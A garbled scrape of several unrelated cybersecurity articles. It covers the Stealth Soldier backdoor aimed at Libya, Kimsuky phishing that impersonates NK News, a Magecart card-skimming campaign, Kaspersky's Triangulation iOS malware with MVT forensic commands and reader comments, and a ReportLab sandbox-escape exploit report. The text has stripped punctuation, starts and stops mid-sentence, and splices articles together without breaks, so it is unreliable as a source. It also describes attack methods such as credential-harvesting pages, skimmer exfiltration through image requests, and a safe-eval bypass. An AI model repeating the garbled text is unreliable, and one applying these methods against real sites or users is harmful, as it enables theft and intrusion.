should keep close track of Asylum Ambuscade

        "text": "Check Point Research identified an ongoing operation against targets in North Africa involving a previously undisclosed multi-stage backdoor called Stealth Soldier The malware Command and Control CC network is part of a larger set of infrastructure used at least in part for spear-phishing campaigns against government entities Based on what we observed in the phishing website themes and VirusTotal submissions the campaign appears to target Libyan organizationsOur investigation began when we came across multiple files submitted to VirusTotal from Libya between the months of November 2022 to January 2023 The file names were in Arabic exe Important and Urgentexeand 401exe Telegram 401exe while the latest uses this name in regards to the Telegraph and not the Telegram application Analysis of the files reveals that all of them are downloaders for different versions of the same malware internally named Stealth SoldierStealth Soldier is a custom implant likely used in a limited set of targeted attacks The implant enables surveillance operations and supports functionality such as keystroke logging and screenshot and microphone recordings The different versions found suggest that Stealth Soldier is actively maintained as of January 2023 the compilation timestamp of its latest versionThe execution flow for all Stealth Soldier versions begins with the execution of the downloader which triggers the infection chain Although the delivery mechanism of the downloader is currently unknown the names suggest they were delivered using social engineering The malware infection chain is complex and contains several files all of which are downloaded from the CC server During the infection process the malware downloads a total of 6 files from the CC servers The main ones areThe workflow below details the full execution scheme of Stealth Soldier Version 9The flow is similar for all versions of the malware with the main difference being the payload and the CC server Version 6 communicates withfilestoragehublive Version 8 communicates withcustomjvupdateliveand Version 9 communicates tofilecloudstoreThe payload starts by collecting information from the victimThe information is sent in different packets and XORed with the key stringWindows Cmdto the IP9415633228The post request has the following headersThe malware sends the stringRequest for new tasksto the CC which responds with the commandsThe malware uses different types of commands some are plugins that are downloaded from the CC and some are modules inside the malware For exampleMicRecordruns in the context of the malware itself and not as an external plugin The recording is performed using themciSendStringAAPI and the following command linesBelow is the full list of supported Stealth Soldier commandsThe payload runs several plugins first it downloads them then writes to their respective filenames and finally executes At the time of our analysis some of the modules were no longer available for downloadScreen CaptureThe screen capture plugin is calledscexeand is downloaded from the CC server It is a compiled NET open-source project named httpsgithubcombencevansscreenshot-desktop The module supports the following arguments can be seen using the flag h or helpThe default name for the screenshot isscreenshotbmpfor full-screen screenshots The module also supports screenshots of a specific windowBrowser CredentialsThis plugin is calledBrCrtxt It starts with another loader that downloads the next stage from the URIBRCRLaenctxt decrypts and writes it toCUsersPublicBRCRLaexe and then executes it It is followed by another layer of downloads that retrieve the final payload fromBRCRShctxt The module runs in memory after it is decrypted the loader runs it from the first byte which is part of the MZ header This header calls to a shellcode that resides at the end of the file The shellcode loads the file itself and then runs from the entry pointThe malwares different stages use the same kind of encryption for their strings communication and payloads Most of the time the encryption is XORed with 2 hardcoded strings even though in the payload the strings are XORed with only one hardcoded string The strings used as XOR keys masquerade as legitimate strings which makes it harder to spot the malwareThe different XOR keys we encountered areWe observed 3 infection chains of Stealth Soldier malware with different versions depending on the payload 6 8 and 9 The flows were pretty similar and had the same logic The differences between the versions indicate active deployment and possible rearrangement of plugins For example the payloads in earlier versions before Version 9 didnt contain the BrowserCreds moduleAdditional differences include the filenames mutex names XOR keys and directory names There is also a difference in the values set to theSOFTWAREMicrosoftWindowsCurrentVersionRunfor persistenceThe watchdog also changed between the versions In Version 6 it only checks if the second stage MSCheckexe exists and if it doesnt downloads a new one with the same nameIn Version 8 theMSCheckexewatchdog checks if the second-stage loaderMSUpdateexeexists in the directoryMSTemp If it doesnt the watchdog tries to read and decrypt fromMSUVersiontxtan address from which to download an updated version This is different from Version 9 where the update mechanism tries directly to download the whole file In Version 9s CC serverfilecloudstorehttpfilecloudstorewe found anMSUVersiontxtfile that leads tohttpsmsheartbeatlivesensaxcvMSUpdate2txtaddress which can show traces of using this CC in the pastHistoric PDNS resolutions reveal the CC domainscustomjvupdateliveandfilestoragehubliveresolved in the past to IP addresses in the same ASN on the IP range185125230024 Actively hunting for malicious activity within this ASN we were able to retrieve a limited set of domains that were likely used to impersonate the Libyan Ministry of Foreign Affairs in a phishing attempt Among those domains were The newly-found phishing domains were hosted on IPs containing additional phishing domains with similar registration patterns Pivoting off those patterns and using hosting history and similar naming conventions mostly combinations of the keywordsmailnotifyverifywebloglive we were able to identify more than 50 domains with similar characteristicsMost of the domains were unresponsive during our analysis Many of them have subdomains with name patterns such as mailyahoo livemail telegramorg and loginoutlook which strongly suggests that they were intended to be used in a phishing campaignThe Version 8 CCcustomejvupdateliveresolved by the IP185125230116was also resolved by multipleEye on the Niledomainswebloginlivemailsecureliveverifymaillive In addition the naming convention used in the phishing domains clustermailnotifyverifyweblogliveis the same one used in theEye on the Nile campaignThroughout the analysis of Stealth Soldier campaigns we were able to identify several infrastructure overlaps with known Eye on the Nile domains This adds up to the narrow regional targeting and similar phishing domain naming patternsThis report describes a previously undocumented malware campaign targeting Libya a country that is not often the focus of APT reports The investigation suggests that the attackers behind this campaign are politically motivated and are utilizing the Stealth Soldier malware and a significant network of phishing domains to conduct surveillance and espionage operations against Libyan and Egyptian targetsGiven the modularity of the malware and the use of multiple stages of infection it is likely that the attackers will continue to evolve their tactics and techniques and deploy new versions of this malware in the near futureFinally our analysis revealed a connection to the previously exposed Eye on the Nile campaign This connection raises the possibility that the current operation may have additional undetected components such as a mobile backdoor that was used in the earlier campaign but was not observed sinceCheck

        "text": "Kimsuky a suspected North Korean advanced persistent threat APT group whose activities align with the interests of the North Korean government is known for its global targeting of organizations and individuals Operating since at least 2012 the group often employs targeted phishing and social engineering tactics to gather intelligence and access sensitive informationA hallmark of the activity we discuss in this post is Kimsukys focus on establishing initial contact and developing a rapport with their targets prior to initiating malicious activities As part of their initial contact strategy the group impersonated Chad OCarroll the founder of NK News and the associated holding company Korea Risk Group using an attacker-created domain nknewspro which closely resembles the legitimate NK News domain nknewsorg The initial email requests the review of a draft article analyzing the nuclear threat posed by North KoreaFurther Kimsukys objective extends to the theft of subscription credentials from NK News To achieve this the group distributes emails that lure targeted individuals to log in on the malicious website nknewspro which masquerades as the authentic NK News site The login form that is presented to the target is designed to capture entered credentialsThis Kimsuky activity indicates the groups growing efforts to establish early communication and foster trust with their targets prior to initiating malicious operations including the delivery of malware Their approach highlights the groups commitment to creating a sense of rapport with the individuals they target potentially increasing the success rate of their subsequent malicious activitiesBy actively targeting high-profile experts in North Korean affairs and stealing subscription credentials from prominent news and analysis outlets focussing on North Korea Kimsuky demonstrates a heightened curiosity in understanding how the international community perceives developments concerning North Korea such as the countrys military activities These actions are probably part of their broader objective to gather strategic intelligence contributing to North Koreas decision-making processesWe observed Kimsuky distributing an HTML-formatted phishing email to selected individuals which requests the review of a draft article analyzing the nuclear threat posed by North Korea The email primarily aims to initiate a subsequent conversation and is intentionally designed to appear benign It impersonates NK News leadership and lacks any malicious artifactsIf the target engages in the conversation Kimsuky eventually follows up with an email that contains an URL to a Google documentIf the target is not responsive Kimsuky follows up with a reminder email in an attempt to engage the target in conversationThe URLs destination is manipulated through the spoofing technique of setting the href HTML property to direct to a website created by Kimsuky This method commonly employed in phishing attacks creates a discrepancy between the perceived legitimacy of the link a genuine Google document and the actual website visited upon clicking the URLThe displayed URL to a Google document points to an actual article hosted on Google Docs delving into the topic of the North Korean nuclear threat The article contains visible edits to give the impression of a genuine draft article aligning with Kimsukys luring tacticThe spoofed destination of the URL redirects the target to an attacker-created website that masquerades as a legitimate Google Docs site for requesting document access such asThe Base-64 encoded segment that is the value of the menu URL query parameter resolves to the targets email addressThis serves as a means of transporting the targets address to the fake Google Docs site which enables the site to dynamically display the address creating a personalized and convincing appearance of legitimacy The design and functionality of this site suggest its potential for reuse in targeting different individualsWe were unable to analyze the functionality behind the Request access web element as the group has taken down the site However given the theme of the site we suspect that it has been designed to capture entered Google credentialsWe also observed Kimsuky attempting to steal credentials for the subscription service of NK News which is known for its comprehensive expert analyses and news reports Gaining access to such reports would provide Kimsuky with valuable insights into how the international community assesses and interprets developments related to North Korea contributing to their broader strategic intelligence-gathering initiativesIn order to accomplish this Kimsuky distributes an email that lure targeted individuals to log in to a spoofed NK News subscription service The emails prompt the recipients to confirm their NK News accounts under the pretext of recent security updatesThe fake login site hosted at httpswwwnknewsproipregister features a login form with the standard web elements such as Sign In Sign Up and Forgot Password buttons When clicked the Sign In button executes the loginAct JavaScript function whereas the rest of the buttons do not conduct any activitiesThe JavaScript code captures entered credentials by issuing an HTTP POST request to httpswwwnknewsproipregisterloginphp and then redirects the user to the legitimate NK News siteThe main website hosted at httpswwwnknewspro redirects to the legitimate NK News site httpsnknewsorg and uses a certificate issued by SectigoSentinelLabs remains actively engaged in monitoring the activities conducted by Kimsuky The findings presented in this post highlight the groups persistent commitment to targeted social engineering attacks and underscore the need for increased awareness and understanding of Kimsukys tactics among potential targets Maintaining vigilance and implementing effective security measures are

        "text": "An attacker under the Magecart umbrellahas infected an unknown number of e-commerce sites in the US UK and five other countries with malware for skimming credit card numbers and personally identifiable information PII belonging to people making purchases on these sites But in a new wrinklethe threat actor is also using the same sites as hosts for delivering the card-skimming malware to other target sitesThey assess that the cyberattacks have been going on for at least one month and have potentially affected tens of thousands of people already Akamai said that in addition to the US and UK it has spotted websites affected by the campaign in Brazil Spain Estonia Australia and PeruAkamai counted Magecart attacks on 9200 e-commerce sites last year of which 2468 remained infected as of the end of 2022The typical modus operandi for these groups has been to surreptitiously inject malicious code into legitimate e-commerce sites or into third-party components such as trackers and shopping carts that the sites use by exploiting known vulnerabilities When users enter credit card information and other sensitive data on the checkout page of compromised websites the skimmers silently intercept the data and send it to a remote server So far attackers have primarily targeted sites running the open source Magento e-commerce platform in Magecart attacksThe latest campaign is slightly different in that the attacker is not just injecting a Magecart card skimmer into target sites but is also hijacking many of them to distribute malicious codeOne of the primary advantages of utilizing legitimate website domains is the inherent trust that these domains have built over time according to the Akamai analysis Security services and domain scoring systems typically assign higher trust levels to domains with a positive track record and a history of legitimate use As a result malicious activities conducted under these domains have an increased chance of going undetected or being treated as benign by automated security systemsIn addition the attacker behind the latest operation has also been attacking sites running not just Magento but other software such as WooCommerce Shopify and WordPressOne of the most notable parts of the campaign is the way the attackers set up their infrastructure to conduct the web skimming campaign Akamai researcher Roman Lvovsky wrote in the blog post Before the campaign can start in earnest the attackers will seek vulnerable websites to act as 'hosts' for the malicious code that is used later on to create the web skimming attackAkamai's analysis of the campaign showed the attacker using multiple tricks to obfuscate the malicious activity For example instead of injecting the skimmer directly into a target website Akamai found the attacker injecting a small JavaScript code snippet into its webpages that then fetched the malicious skimmer from a host websiteThe attacker designed the JavaScript loader to look like Google Tag Manager Facebook Pixel tracking code and other legitimate third-party services so it becomes hard to spot The operator of the ongoing Magecart-like campaign also has been using Base64 encoding to obfuscate the URLs of compromised websites hosting the skimmerThe process of exfiltrating the stolen data is executed through a straightforward HTTP request which is initiated by creating an IMG tag within the skimmer code Lvovsky wrote The stolen data is then appended to the request as query parameters encoded as a Base64 stringAs a sophisticated detailAkamai also found code inthe skimmer malware that ensured it did not steal the same credit card and personal information twiceCopyright 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place London SW1P 1WG"

staff and a range of other countries Credit Terroa via Getty ImagesKaspersky researchers say they have uncovered a mobile malware campaign targeting their researchers the same day that Russian intelligence services referenced the report to accuse the US government and Apple of collaborating to place backdoors in Apple mobile phonesBasically the phone was connecting to the servers getting the attachment or iMessage and then the next minute the phone started connecting to some weird suspicious domain So we started looking more into that and we were able to recover this APT platform that was being delivered to the devices Igor Kuznetsov head of EEMEA at Kaspersky's Global Research and Analysis Team told SC Media Thursday According to Kuznetsov the first exploit provides initial access and compromise while the second gives an attacker kernel-level access to the device The individuals targeted were not just security researchers but also managers and other top executives at the firmIt gains complete root access over the phone basically all the sensors the microphone the screen all the data on the phone and it starts getting the commands from the server and doing whatever the operator wants he saidKaspersky is still investigating the final payload but the company said they believe the activity has been going on for yearsThe timelines of multiple devices indicate that they may be reinfected after rebooting The oldest traces of infection that we discovered happened in 2019 As of the time of writing in June 2023 the attack is ongoing and the most recent version of the devices successfully targeted is iOS 157 the researchers wroteIn the course of ensuring the security of the Russian telecommunications infrastructure anomalies specific only to users of Apple mobile phones and caused by operation of previously unknown malicious software VPO that uses software vulnerabilities provided by the manufacturer the FSB wrote according to a Google-translated transcriptTo be clear those claims go well beyond what is contained in Kaspersky's report on June 1 and Kuznetsov told SC Media they are not attributing the activity to any government or actor at this time nor are they claiming that Apple was a willing participant in the scheme Their analysis has been confined to the phones of internal employees and they have no information at this time about other individuals organizations or countries that may have been targeted He said when the company discovered the campaign it notified the CERTs of countries around the world including Russia and only learned of the claims when the Russian CERT posted its own reportWe are not attributing it to any actor at all and for us it is a completely new unknown actor Kuznetsov saidHowever founder Eugene Kaspersky also said on Twitter that We are quite confident that Kaspersky was not the main target of this cyberattackIn a statement sent to SC Media an Apple spokesperson categorically denied the accusations from the Russian government that they colluded with US agencies saying we have never worked with any government to insert a backdoor into any Apple product and never willTaking the public claims of Russian intelligence or government services at face value can be treacherous but the underlying research and comments from Kaspersky and Amnesty Tech lend credence to some the charges though Kuznetsov made it clear that Kaspersky is not attributing this campaign to a specific actor or country nor is it claiming that Apple collaborated with any party to deliberately place vulnerabilities into their devicesKuznetsov said Kaspersky is continuing to investigate the chain of exploits which he described as very very complicated and identify specific parts of the operating system that were being targeted in the campaignCorrection This story was updated to reflect Igor Kuznetsov's current titleDerek is a senior editor and reporter at SC Media where he has spent the past three years providing

databases The timestamps of the files folders and the database records allow to roughly reconstruct the events happening to the device The mvt-ios utility produces a sorted timeline of events into a file called timelinecsv similar to a super-timeline used by conventional digital forensic toolsUsing this timeline we were able to identify specific artifacts that indicate the compromise This allowed to move the research forward and to reconstruct the general infection sequenceThe malicious toolset does not support persistence most likely due to the limitations of the OS The timelines of multiple devices indicate that they may be reinfected after rebooting The oldest traces of infection that we discovered happened in 2019 As of the time of writing in June 2023 the attack is ongoing and the most recent version of the devices successfully targeted is iOS 157The analysis of the final payload is not finished yet The code is run with root privileges implements a set of commands for collecting system and user information and can run arbitrary code downloaded as plugin modules from the CC serverIt is important to note that although the malware includes portions of code dedicated specifically to clear the traces of compromise it is possible to reliably identify if the device was compromised Furthermore if a new device was set up by migrating user data from an older device the iTunes backup of that device will contain the traces of compromise that happened to both devices with correct timestampsAll potential target devices must be backed up either using iTunes or an open-source utility idevicebackup2 from the package libimobiledevice The latter is shipped as a pre-built package with the most popular Linux distributions or can be built from the source code for MacOSLinuxTo create a backup with idevicebackup2 run the following commandidevicebackup2 backup --full backupdirectoryYou may need to enter the security code of the device several times and the process may take several hours depending on the amount of user data stored in itOnce the backup is ready it has to be processed by the Mobile Verification Toolkit If Python 3 is installed in the system run the following commandpip install mvtIf the owner of the device has set up encryption for the backup previously the backup copy will be encrypted In that case the backup copy has to be decrypted before running the checksmvt-ios decrypt-backup -d decryptedbackupdirectory backupdirectorymvt-ios check-backup -o mvtoutputdirectory decryptedbackupdirectoryThis command will run all the checks by MVT and the output directory will contain several JSON and CSV files For the methodology described in this blogpost you will need the file called timelinecsvExample2021-10-30 163524923368Z

Triangulation iOS devices targeted with previously unknown malwareYour email address will not be published Required fields are marked Name Email Bil iOS 16x not affectedSecurelist Hi BilWe identified that the latest version of iOS that was targeted by Triangulation is 157 However given the sophistication of the cyberespionage campaign and the complexity of analysis of iOS platform we cant guarantee that other versions of iOS are not affectedSedric Louissaint Very well written Thank you for sharing and being transparentJane Doe For clarity this forensic examination is about the novel malware the payload delivery mechanism could be Pegasus or Graphite and not the built-in Apple backdoor as evident by the Wireshark dump and the supplied CC domains However make no mistake about this yes the device manufacturer Apple could be compelled to work with the IC intelligence community and we would never know network traffic could appear as routine Apple service For now on Apples merit the device iCloud synchronization and back-ups are end-to-end encrypted if enabled without Apple having the key The question is if there is mechanism to recover the ones private key eg similar to how the macOS FileVault FDE key could be stored with Apple for convenienceWaqas Its unfortunate to see Kaspersky a long-standing company facing targeting from both the US and Russian intelligence agenciesJJ You state Without any user interaction the message triggers a vulnerability that leads to code executionIs this vulnerability reported to apple and what is their reaction Interpreting your great report a bug fix from apple and a reboot should fix the attackSecurelist Hi JJYes We have shared information with the Apple Security Research teamAs of time of writing we were able to identify one of many vulnerabilities that were exploited that is most likely CVE-2022-46690 This vulnerability was fixed in iOS 162 However given the sophistication of the cyberespionage campaign and the complexity of analysis of the iOS platform further research will surely reveal more details on the matter We will update the community about new findings once they emergeAs to rebooting Triangulation blocks the opportunity to update iOS which means that even if the device is rebooted it still has an opportunity to re-infect it A factory reset combined with the immediate system update would solve the problemArtur What about iOS 16x is it not affected by default or via Lockdown Mode Securelist Hi ArturKaspersky cybersecurity experts identified that the latest version of iOS that was targeted by Triangulation is 157 However given the sophistication of the cyberespionage campaign and the complexity of analysis of iOS platform the further research may reveal more details on the matter We will update the community about new findings once they emergeSecurelist Most probably Lockdown Mode can help protecting against this attackTimothy Avele Thank you for this thourough and in-depth analysis

summary actually include all what happen by easy way that really very simplify my problem that i was not understood since 4 months ago till last few hours although contacted Apple team many times unfortunately the problems still at ios 16 for sure as you advised due to wrong backup or recovery as we never guess that apple ID may be hacked we are kindly ask you to advised us if there Kasper tool or support team can explore who is hacking us or is there exeperts can help us by provide them the analytic data what ever its cost we trust kasper team as always will supportJW Doesnt the malicious message with an attachment trigger an alert if you have them enabled I am wondering how this is 0-click without user interaction if the device shows an alert andor vibrates when a message

        "text": "A researcher has published a working exploit for a remote code execution RCE flaw impacting ReportLab Toolkit a popular Python library used by numerous projects to generate PDF files from HTML inputThe problem stems from the ability to bypass sandbox restrictions on 'rlsafeeval' whose role is to prevent malicious code execution leading to the attacker accessing potentially dangerous Python built-in functionsThe 'rlsafeeval' function was introduced as a measure to prevent a similar remote code execution issue that was discovered in 2019 hence the researcher focused on bypassing itThe presented PoC retrieves the built-in 'type' function that helps create a new class named 'Word' which inherits from the 'str' class which can bypass safety checks and give access to sensitive attributes like 'code'Next 'type' is called on itself to get around safe eval checks concerning argument count restrictions allowing the attacker to abuse the original built-in 'type' function for creating new classes and objectsThis leads to constructing a malicious function from the bytecode of a compiled one which when executed may perform an arbitrary action In the researcher's example it calls an OS command to create a file called 'exploited' in the tmp directoryThe researcher notes that the entire exploit code must be run with eval in a single expression so it uses the 'list comprehension' trick to structure it as suchThe Cure53 researcher Elyas Damejwarns in his write-up that the exploitation of CVE-2023-33733 is as simple as incorporating malicious code in an HTML file that will be converted to PDF on software that uses the ReportLab libraryThe widespread use of the library and a public exploit puts many users at risk Software vendors using the library can address the resulting supply chain risk by applying the available security updateThe researcher clarified that the vulnerabilityimpacts all earlier versions of the library"
